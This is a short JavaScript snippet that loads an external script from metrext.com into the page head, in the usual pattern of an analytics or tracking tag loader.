(function() {
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = '//metrext.com/24e961841a2970a134.js';
    head.appendChild(script);
})();
